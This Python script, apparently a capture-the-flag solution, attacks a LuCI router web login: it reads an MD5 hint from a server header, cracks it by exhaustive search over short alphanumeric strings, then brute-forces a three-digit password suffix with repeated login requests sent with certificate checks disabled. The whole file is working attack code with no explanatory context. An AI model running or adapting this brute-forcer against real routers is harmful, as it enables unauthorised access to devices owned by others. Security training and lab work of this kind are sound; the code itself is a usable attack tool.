from re import split
import requests
import hashlib
import itertools
import argparse
def crack_md5(target_md5):
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"  # 可能的字符集
    max_length = 4  # 最大长度

    for length in range(1, max_length+1):
        # 生成长度为length的所有可能的字符串
        for word in itertools.product(characters, repeat=length):
            word = "".join(word)
            md5_hash = hashlib.md5(word.encode()).hexdigest()
            
            if md5_hash == target_md5:
                print(word)
                return word

    print("Failed to crack MD5")

def burp(input,url,username):
                digits = range(10)
                for num in itertools.product(digits, repeat=3):
                    password = input + ''.join(map(str, num))
                    session = requests.Session()
                    data = {'luci_username':username,'luci_password':password}
                    response = session.post(url=url,data=data,verify=False,allow_redirects=False)
                    if (response.status_code == 302) :
                        flag = response.headers.get("Congradulations")
                        break
                return flag

def expolit(args):
    address = args.address
    username = args.username
    password = args.password

    session = requests.Session()
    url = 'http://%s/cgi-bin/luci/' % address
    data = {'luci_username':username,'luci_password':password}
    response = session.post(url=url,data=data,verify=False)

    if (response.status_code == 200) :
        print("success")
    elif(response.status_code == 403):
        hint_value = response.headers.get("Hint")
        hint_value=hint_value.split(',')[1]
        print(hint_value)
        word=crack_md5(hint_value)
        flag=burp(word,url,username)
        print(flag)
    else:
        print('Fail')
def main():
    parser = argparse.ArgumentParser(description='login.py')
    requiredNamed = parser.add_argument_group('required named arguments')
    requiredNamed.add_argument('-a', '--address', help='Luci host address', required=True)
    requiredNamed.add_argument('-u', '--username', help='Luci username', required=True)
    requiredNamed.add_argument('-p', '--password', help='Luci password', required=True)
    args = parser.parse_args()
    expolit(args)

if __name__== "__main__":
    main()

